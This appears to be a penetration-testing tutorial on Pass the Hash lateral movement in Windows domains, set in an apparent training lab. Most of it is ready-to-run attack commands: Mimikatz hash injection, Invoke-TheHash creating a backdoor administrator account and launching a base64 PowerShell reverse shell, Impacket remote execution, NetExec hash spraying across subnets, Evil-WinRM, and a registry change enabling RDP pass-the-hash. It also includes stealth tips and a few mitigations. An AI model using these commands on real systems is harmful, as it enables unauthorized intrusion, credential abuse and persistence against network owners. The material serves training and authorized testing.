# Pass the Hash (PtH)

[Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) is a lateral movement technique that exploits the NTLM authentication protocol's core design: the NT hash of a user's password is the credential itself, not just a representation of it. Because NTLM uses a challenge-response mechanism where the client proves knowledge of the hash rather than the plaintext password, a captured hash can be used directly for authentication without ever needing to crack it.

## Why PtH Works

[Windows NTLM](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) does not salt stored password hashes. This means the NT hash for a given password is identical across every system where that password is used, and it remains valid for authentication until the password is changed. When an NTLM authentication request is made, the server issues a challenge, and the client computes a response using the NT hash — the server then verifies the response without ever seeing the plaintext. An attacker who controls the hash can compute a valid response just as the legitimate user would. NT hashes are obtained by dumping the local SAM database, extracting from NTDS.dit on a Domain Controller, or pulling directly from `lsass.exe` process memory.

## PtH from Windows

### Mimikatz sekurlsa::pth

[Mimikatz](https://github.com/gentilkiwi) performs PtH by injecting the supplied hash into a new process's authentication context using the `sekurlsa::pth` module. The injected process then authenticates to remote systems using that hash transparently, as if the user had logged in normally:

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

This spawns a `cmd.exe` instance running as julio. Any network authentication initiated from that window (file share access, WMI, etc.) will use julio's hash automatically. The `/run` parameter accepts any executable — using `powershell.exe` instead of `cmd.exe` gives a more capable shell.

### Invoke-TheHash (SMB and WMI)

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) is a PowerShell toolkit that performs PtH directly through .NET's `TCPClient`, authenticating via NTLMv2 over SMB or WMI without needing local admin rights on the client machine:

```powershell
Import-Module .\Invoke-TheHash.psd1

# SMB execution - create a backdoor admin account on DC01
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio \
    -Hash 64F12CDDAA88057E06A81B54E73B949B \
    -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# WMI execution - deliver a reverse shell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio \
    -Hash 64F12CDDAA88057E06A81B54E73B949B \
    -Command "powershell -e <base64_payload>"
```

For generating the Base64-encoded reverse shell payload, [revshells.com](https://www.revshells.com/) provides ready-made payloads for various shell types. Set the listener IP and port, select `PowerShell #3 (Base64)`, and paste the output directly into the `-Command` parameter. Start the listener before executing:

```powershell
.\nc.exe -lvnp 8001
```

## PtH from Linux

### Impacket

[Impacket](https://github.com/SecureAuthCorp/impacket) provides the widest range of PtH-capable execution methods. The hash format required is `LMhash:NThash` — since LM hashes are disabled by default on modern Windows, the LM portion is simply left as 32 zeros or replaced with `aad3b435b51404eeaad3b435b51404ee` (the empty LM hash):

```bash
# Interactive SYSTEM shell via PSExec (uploads and runs a service binary)
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# WMI execution (quieter, no service creation)
impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# SMB execution
impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# Scheduled task execution
impacket-atexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 whoami
```

Each method leaves a different forensic footprint. `psexec` creates a service and uploads a binary to ADMIN$, making it the noisiest. `wmiexec` runs commands through WMI and returns output without writing files to disk, making it considerably stealthier.

### NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) is most useful for PtH when you need to test a hash across an entire subnet to identify where it grants local admin access:

```bash
# Spray a hash across a subnet looking for local admin access
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Same, but explicitly use local account authentication only
netexec smb 172.16.1.0/24 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth

# Execute a command on a confirmed target
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

A `(Pwn3d!)` result means the hash grants local administrator access to that host. The `--local-auth` flag is important when testing for local admin password reuse across the subnet — it sends only one authentication attempt per host, reducing lockout risk and scoping the test to local accounts rather than domain accounts. Microsoft's [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) directly counters this by randomising the local administrator password per machine on a configurable interval, so a single compromised local hash cannot be reused elsewhere. Full documentation is on the [NetExec wiki](https://www.netexec.wiki/).

### Evil-WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) authenticates over WinRM (port 5985) using the `-H` flag, providing a full PowerShell remoting session. This is useful when SMB (port 445) is blocked by a host firewall or segmentation rule:

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# For domain accounts, use the UPN format
evil-winrm -i 10.129.201.126 -u julio@inlanefreight.htb -H 64F12CDDAA88057E06A81B54E73B949B
```

### RDP via xfreerdp

GUI-based PtH over RDP requires Restricted Admin Mode to be enabled on the target host first. By default it is disabled. If you already have a foothold on the machine (via any of the methods above), enable it with a registry write:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Then connect from Linux:

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

## UAC Restrictions on Local Account PtH

UAC silently blocks PtH for most local accounts through the `LocalAccountTokenFilterPolicy` registry key. Understanding this is critical to knowing why a hash may authenticate via SMB but then fail to execute commands:

| Scenario | PtH Works? |
|---|---|
| Domain account with local admin rights | Yes, always |
| Built-in local Administrator (RID 500) | Yes, by default |
| Other local admin accounts (RID > 500) | No, unless `LocalAccountTokenFilterPolicy` is set to `1` |
| RID 500 account with `FilterAdministratorToken` enabled | No |

Setting `LocalAccountTokenFilterPolicy` to `1` allows all local admin accounts to perform remote administration via PtH, but as detailed in Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167), this carries significant risk and should be flagged as a finding during engagements. [LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899) combined with keeping `LocalAccountTokenFilterPolicy` at `0` are the two most effective mitigations against lateral movement via local account PtH.

## Tool Selection Reference

| Tool | Platform | Protocol | Notes |
|---|---|---|---|
| Mimikatz `sekurlsa::pth` | Windows | Any (injected into process) | Requires local admin on source machine |
| Invoke-TheHash SMB/WMI | Windows | SMB, WMI | No local admin required on source |
| impacket-psexec | Linux | SMB | Noisy — creates a service |
| impacket-wmiexec | Linux | WMI | Stealthier — no service or file drop |
| NetExec `--local-auth` | Linux | SMB | Best for subnet-wide local hash spray |
| Evil-WinRM | Linux | WinRM (5985) | Useful when SMB is blocked |
| xfreerdp `/pth` | Linux | RDP | Requires Restricted Admin Mode on target |
